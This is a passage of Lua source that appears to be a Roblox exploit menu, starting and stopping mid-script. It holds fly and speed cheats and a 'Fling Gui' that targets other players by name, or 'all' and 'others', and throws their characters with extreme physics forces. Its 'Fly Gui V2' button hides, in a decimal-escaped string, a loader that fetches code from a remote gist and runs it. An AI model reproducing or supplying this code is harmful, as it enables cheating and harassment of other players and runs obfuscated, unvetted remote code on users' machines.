		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then



		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			game:GetService("RunService").RenderStepped:Wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end
			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false




	else
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

up.MouseButton1Down:connect(function()
	tis = up.MouseEnter:connect(function()
		while tis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

up.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

down.MouseButton1Down:connect(function()
	dis = down.MouseEnter:connect(function()
		while dis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

down.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
	end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'cannot be less than 1'
		wait(1)
		speed.Text = speeds
	else
		speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local hb = game:GetService("RunService").Heartbeat	


					tpwalking = true
					local chr = game.Players.LocalPlayer.Character
					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
						if hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

closebutton.MouseButton1Click:Connect(function()
	main:Destroy()
end)

mini.MouseButton1Click:Connect(function()
	up.Visible = false
	down.Visible = false
	onof.Visible = false
	plus.Visible = false
	speed.Visible = false
	mine.Visible = false
	mini.Visible = false
	mini2.Visible = true
	main.Frame.BackgroundTransparency = 1
	closebutton.Position =  UDim2.new(0, 0, -1, 57)
end)

mini2.MouseButton1Click:Connect(function()
	up.Visible = true
	down.Visible = true
	onof.Visible = true
	plus.Visible = true
	speed.Visible = true
	mine.Visible = true
	mini.Visible = true
	mini2.Visible = false
	main.Frame.BackgroundTransparency = 0 
	closebutton.Position =  UDim2.new(0, 0, -1, 27)
end)
end)


Section:NewButton("Fling Gui V3", "New overpower", function()
local lplayer = game:GetService('Players').LocalPlayer

local yeeting = false
function GetPlayer(String)
local Found = {}
local strl = String:lower()
if strl == "all" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
table.insert(Found,v)
end
elseif strl == "others" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name ~= lplayer.Name then
table.insert(Found,v)
end
end 
elseif strl == "me" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name == lplayer.Name then
table.insert(Found,v)
end
end 
else
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name:lower():sub(1, #String) == String:lower() then
table.insert(Found,v)
end
end 
end
return Found 
end
function ahh(thing)
local asd = {'yeet','gui','yeet gui'}
local f = string.upper(asd[math.random(1,#asd)])
return f
end
local XD = Instance.new("ScreenGui")
local BeGONE = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local AA = Instance.new("TextBox")
local yets = Instance.new("TextButton")
local stopyets = Instance.new("TextButton")
local ultrayets = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
XD.Name = "XD"
XD.Parent = game:GetService('CoreGui')
BeGONE.Name = "BeGONE"
BeGONE.Parent = XD
BeGONE.Active = true
BeGONE.Draggable = true
BeGONE.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
BeGONE.BorderSizePixel = 0
BeGONE.Position = UDim2.new(-0.0207920745, 111, 0.722570539, -1)
BeGONE.Size = UDim2.new(0, 389, 0, 129)
TextLabel.Parent = BeGONE
TextLabel.BackgroundColor3 = Color3.new(1, 0.419608, 0.129412)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 389, 0, 22)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "fe yeet gui v3 (yes v3 xd) by scuba kermit"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 16
TextLabel.TextWrapped = true
TextLabel_2.Parent = BeGONE
TextLabel_2.BackgroundColor3 = Color3.new(0.831373, 0.509804, 0.054902)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, 0.169230849, 0)
TextLabel_2.Size = UDim2.new(0, 389, 0, 9)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = ""
TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
TextLabel_2.TextSize = 14
AA.Name = "AA"
AA.Parent = BeGONE
AA.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
AA.BorderSizePixel = 0
AA.Position = UDim2.new(0.20364143, 0, 0.299216866, 0)
AA.Size = UDim2.new(0, 229, 0, 35)
AA.Font = Enum.Font.SourceSans
AA.PlaceholderColor3 = Color3.new(0.831373, 0.831373, 0.831373)
AA.PlaceholderText = "Player you wanna yeet (can be shortened)"
AA.Text = ""
AA.TextColor3 = Color3.new(1, 1, 1)
AA.TextSize = 14
AA.TextWrapped = true
yets.Name = "yets"
yets.Parent = BeGONE
yets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
yets.BorderSizePixel = 0
yets.Position = UDim2.new(0.0364736132, 0, 0.646153867, 0)
yets.Size = UDim2.new(0, 94, 0, 28)
yets.Font = Enum.Font.SourceSans
yets.Text = "Y E E T"
yets.TextColor3 = Color3.new(1, 1, 1)
yets.TextSize = 14
yets.TextWrapped = true
stopyets.Name = "stopyets"
stopyets.Parent = BeGONE
stopyets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
stopyets.BorderSizePixel = 0
stopyets.Position = UDim2.new(0.722082794, 0, 0.646153867, 0)
stopyets.Size = UDim2.new(0, 94, 0, 28)
stopyets.Font = Enum.Font.SourceSans
stopyets.Text = "Stop Y E E T ing"
stopyets.TextColor3 = Color3.new(1, 1, 1)
stopyets.TextSize = 14
stopyets.TextWrapped = true
ultrayets.Name = "ultrayets"
ultrayets.Parent = BeGONE
ultrayets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
ultrayets.BorderSizePixel = 0
ultrayets.Position = UDim2.new(0.298684418, 0, 0.646154106, 0)
ultrayets.Size = UDim2.new(0, 156, 0, 28)
ultrayets.Font = Enum.Font.SourceSans
ultrayets.Text = "U L T R A Y E E T"
ultrayets.TextColor3 = Color3.new(1, 1, 1)
ultrayets.TextSize = 14
ultrayets.TextWrapped = true
ImageLabel.Parent = XD
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.9, 0, 0.835423172, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Image = "rbxassetid://2152234287"
TextLabel_3.Parent = ImageLabel
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.110989988, 0, 0.103538811, 0)
TextLabel_3.Size = UDim2.new(0, 77, 0, 23)
TextLabel_3.Font = Enum.Font.Arial
TextLabel_3.Text = "yeet gui"
TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
TextLabel_3.TextSize = 14
yets.MouseButton1Click:Connect(function()
local target = unpack(GetPlayer(AA.Text)).Character

game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
yeeting = true
local coin = Instance.new('BodyThrust',game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
coin.Force = Vector3.new(2590,0,2590)
coin.Name = "yeetforce"
repeat game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game["Run Service"].Heartbeat:wait() until not target.Head or yeeting == false
end)

stopyets.MouseButton1Click:Connect(function()
ypcall(function()
game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.yeetforce:Destroy()
game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = false
end)
yeeting = false
end)
ultrayets.MouseButton1Click:Connect(function()
local target = unpack(GetPlayer(AA.Text)).Character

game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
yeeting = true
local coin = Instance.new('BodyThrust',game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
coin.Force = Vector3.new(9999,9999,9999)
coin.Name = "yeetforce"
repeat game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game["Run Service"].Heartbeat:wait() until not target.Head or yeeting == false
end)

while game["Run Service"].Heartbeat:wait() do
ImageLabel.Rotation = ImageLabel.Rotation + 1
TextLabel_3.Text = ahh('yeet gui')
end
end)

Section:NewButton("Fly Gui V2", "FlyV2 Original", function()
--ARCEUS X FLY V2 SCRIPT BY me_ozoneYT
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)

Section:NewButton("Fly GUI ", "Fly Around like a bitch", function()
game:GetService("StarterGui"):SetCore("SendNotification",{

                Title = "Credits";

                Text = "Modified By SpekzZ";

                Duration = 3.5;

            })

-- Gui to Lua

-- Version: 3.2

-- Instances:

local main = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local up = Instance.new("TextButton")

local down = Instance.new("TextButton")

local onof = Instance.new("TextButton")

local TextLabel = Instance.new("TextLabel")

local plus = Instance.new("TextButton")

local speed = Instance.new("TextLabel")

local mine = Instance.new("TextButton")

--Properties:

main.Name = "main"

main.Parent = game.CoreGui

main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = main

Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)

Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)

Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)

Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"

up.Parent = Frame

up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)

up.Size = UDim2.new(0, 44, 0, 28)

up.Font = Enum.Font.SourceSans

up.Text = "UP"

up.TextColor3 = Color3.fromRGB(0, 0, 0)

up.TextSize = 14.000

down.Name = "down"

down.Parent = Frame

down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)

down.Position = UDim2.new(0, 0, 0.491228074, 0)

down.Size = UDim2.new(0, 44, 0, 28)

down.Font = Enum.Font.SourceSans

down.Text = "DOWN"

down.TextColor3 = Color3.fromRGB(0, 0, 0)

down.TextSize = 14.000

onof.Name = "onof"

onof.Parent = Frame

onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)

onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)

onof.Size = UDim2.new(0, 56, 0, 28)

onof.Font = Enum.Font.SourceSans

onof.Text = "fly"

onof.TextColor3 = Color3.fromRGB(0, 0, 0)

onof.TextSize = 14.000

TextLabel.Parent = Frame

TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)

TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)

TextLabel.Size = UDim2.new(0, 100, 0, 28)

TextLabel.Font = Enum.Font.SourceSans

TextLabel.Text = "Fly Gui V2"

TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)

TextLabel.TextScaled = true

TextLabel.TextSize = 14.000

TextLabel.TextWrapped = true

plus.Name = "plus"

plus.Parent = Frame

plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)

plus.Position = UDim2.new(0.231578946, 0, 0, 0)

plus.Size = UDim2.new(0, 45, 0, 28)

plus.Font = Enum.Font.SourceSans

plus.Text = "+"

plus.TextColor3 = Color3.fromRGB(0, 0, 0)

plus.TextScaled = true

plus.TextSize = 14.000

plus.TextWrapped = true

speed.Name = "speed"

speed.Parent = Frame

speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)

speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)

speed.Size = UDim2.new(0, 44, 0, 28)

speed.Font = Enum.Font.SourceSans

speed.Text = "1"

speed.TextColor3 = Color3.fromRGB(0, 0, 0)

speed.TextScaled = true

speed.TextSize = 14.000

speed.TextWrapped = true

mine.Name = "mine"

mine.Parent = Frame

mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)

mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)

mine.Size = UDim2.new(0, 45, 0, 29)

mine.Font = Enum.Font.SourceSans

mine.Text = "-"

mine.TextColor3 = Color3.fromRGB(0, 0, 0)

mine.TextScaled = true

mine.TextSize = 14.000

mine.TextWrapped = true

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character

local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

Frame.Active = true -- main = gui

Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then

		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)

		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)

	else 

		nowe = true

		for i = 1, speeds do

			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	

				tpwalking = true

				local chr = game.Players.LocalPlayer.Character

				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

				while tpwalking and hb:Wait() and chr and hum and hum.Parent do

					if hum.MoveDirection.Magnitude > 0 then

						chr:TranslateBy(hum.MoveDirection)

					end

				end

			end)

		end

		game.Players.LocalPlayer.Character.Animate.Disabled = true

		local Char = game.Players.LocalPlayer.Character

		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do

			v:AdjustSpeed(0)

		end

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)

		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)

	end

	

		local plr = game.Players.LocalPlayer

		local UpperTorso = plr.Character.LowerTorso

		local flying = true

		local deb = true

		local ctrl = {f = 0, b = 0, l = 0, r = 0}

		local lastctrl = {f = 0, b = 0, l = 0, r = 0}

		local maxspeed = 50

		local speed = 0

		local bg = Instance.new("BodyGyro", UpperTorso)

		bg.P = 9e4

		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)

		bg.cframe = UpperTorso.CFrame

		local bv = Instance.new("BodyVelocity", UpperTorso)

		bv.velocity = Vector3.new(0,0.1,0)

		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)

		if nowe == true then

			plr.Character.Humanoid.PlatformStand = true

		end

		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do

			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then

				speed = speed+.5+(speed/maxspeed)

				if speed > maxspeed then

					speed = maxspeed

				end

			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then

				speed = speed-1

				if speed < 0 then

					speed = 0

				end

			end

			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then

				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed

				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}

			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then

				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed

			else

				bv.velocity = Vector3.new(0,0,0)

			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)

		end

		ctrl = {f = 0, b = 0, l = 0, r = 0}

		lastctrl = {f = 0, b = 0, l = 0, r = 0}

		speed = 0

		bg:Destroy()

		bv:Destroy()

		plr.Character.Humanoid.PlatformStand = false

		game.Players.LocalPlayer.Character.Animate.Disabled = false

		tpwalking = false

	

end)

up.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,0)

	

end)

down.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-2,0)

end)

game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)

	wait(0.7)

	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false

	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)

plus.MouseButton1Down:connect(function()

	speeds = speeds + 1

	speed.Text = speeds

	if nowe == true then

		

	tpwalking = false

	for i = 1, speeds do

		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	

			tpwalking = true

			local chr = game.Players.LocalPlayer.Character

			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

			while tpwalking and hb:Wait() and chr and hum and hum.Parent do

				if hum.MoveDirection.Magnitude > 0 then

					chr:TranslateBy(hum.MoveDirection)

				end

			end

		end)

		end

		end

end)

mine.MouseButton1Down:connect(function()

	if speeds == 1 then

		speed.Text = 'can not be less than 1'

		wait(1)

		speed.Text = speeds

	else

	speeds = speeds - 1

		speed.Text = speeds

		if nowe == true then

	tpwalking = false

	for i = 1, speeds do

		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	

			tpwalking = true

			local chr = game.Players.LocalPlayer.Character

			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

			while tpwalking and hb:Wait() and chr and hum and hum.Parent do

				if hum.MoveDirection.Magnitude > 0 then

					chr:TranslateBy(hum.MoveDirection)

				end

			end

		end)

		end

		end

		end

end)

end)

Section:NewButton("Animation GUI", "Different Movement", function()
